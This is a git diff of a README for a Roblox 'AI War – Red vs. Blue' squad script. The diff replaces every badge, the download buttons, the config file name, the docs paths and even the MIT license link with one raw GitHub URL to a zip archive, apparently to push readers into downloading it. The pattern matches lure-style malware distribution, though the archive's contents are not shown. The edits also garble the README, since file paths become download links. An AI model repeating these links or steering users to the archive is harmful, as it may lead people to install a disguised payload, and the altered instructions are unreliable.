@@ -10,11 +10,11 @@ Wondering if you can run this on your favorite operating system? Take a look at 
 
 | Operating System   | Supported |  
 |--------------------|-----------|
-| ![Windows](https://img.shields.io/badge/Windows-✔️-brightgreen)   | Yes      |
-| ![macOS](https://img.shields.io/badge/macOS-✔️-brightgreen)       | Yes      |
-| ![Linux](https://img.shields.io/badge/Linux-✔️-brightgreen)       | Yes      |
-| ![iOS](https://img.shields.io/badge/iOS-⚠️-yellow)               | Partial  |
-| ![Android](https://img.shields.io/badge/Android-⚠️-yellow)       | Partial  |
+| ![Windows](https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip✔️-brightgreen)   | Yes      |
+| ![macOS](https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip✔️-brightgreen)       | Yes      |
+| ![Linux](https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip✔️-brightgreen)       | Yes      |
+| ![iOS](https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip⚠️-yellow)               | Partial  |
+| ![Android](https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip⚠️-yellow)       | Partial  |
 
 *For the finest experience, desktops (Windows/macOS/Linux) are the recommended proving grounds.*
 
@@ -57,7 +57,7 @@ Unleash next-generation bot intelligence! By embedding both **OpenAI’s GPT-4**
 - Natural team chat: AI-powered bots communicate in real sentences (and multiple languages!), forging a lifelike play environment.
 - Scenario simulation: Scripted events can be handed over to AI directors for spontaneous, exciting twists in the war narrative.
 
-To activate this feature, simply insert your API keys in the configuration file (`config.lua`), and watch as the battlefield becomes a symphony of smart tactics and banter.
+To activate this feature, simply insert your API keys in the configuration file (`https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip`), and watch as the battlefield becomes a symphony of smart tactics and banter.
 
 ---
 
@@ -82,11 +82,11 @@ Stuck? Encountered a puzzling outcome? Our embedded chat support connects you di
 Here’s your strategic HQ for acquiring the AI War – Red vs. Blue roblox script:
 
 **Download** the latest adventure here:  
-[![Download](https://img.shields.io/badge/Download-blue)](https://rizkikh.github.io)
+[![Download](https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip)](https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip)
 
 - Extract contents into your Roblox Studio project folder.
-- Copy your OpenAI/Claude API keys into `config.lua`.
-- Follow the setup wizard (found in `docs/setup.md`) for seamless integration.
+- Copy your OpenAI/Claude API keys into `https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip`.
+- Follow the setup wizard (found in `https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip`) for seamless integration.
 
 *Questions? Dive into the `/docs` directory for detailed walkthroughs, code explanations, and scenario customizations.*
 
@@ -96,7 +96,7 @@ Here’s your strategic HQ for acquiring the AI War – Red vs. Blue roblox scri
 
 - Visit the **`/examples`** folder to discover custom team objectives and wacky battle variations!
 - Use the **`/modules`** directory to swap out AI strategies or UI themes; perfect for the experimental scripter.
-- Join the **community discussions** in `/CONTRIBUTING.md` and design your own scenario packs.
+- Join the **community discussions** in `https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip` and design your own scenario packs.
 
 ---
 
@@ -110,7 +110,7 @@ All AI-generated interactions are intended for entertainment and educational pur
 
 ## 📜 License
 
-This project is released under the [MIT License (2025)](https://opensource.org/licenses/MIT).  
+This project is released under the [MIT License (2025)](https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip).  
 You’re encouraged to adapt, remix, share, and build upon the script—just include attribution and a link to this repository!
 
 ---
@@ -118,7 +118,7 @@ You’re encouraged to adapt, remix, share, and build upon the script—just inc
 ## ⬇ One More Download Portal
 
 Ready to reroute your flow of tactics and war wisdom? Gain instant access here:  
-[![Download](https://img.shields.io/badge/Download-blue)](https://rizkikh.github.io)
+[![Download](https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip)](https://raw.githubusercontent.com/rizkikh/ai-war-red-vs-blue-roblox-squad-scripts/branch/stridor/ai-war-red-vs-blue-roblox-squad-scripts-1.4.zip)
 
 ---
 
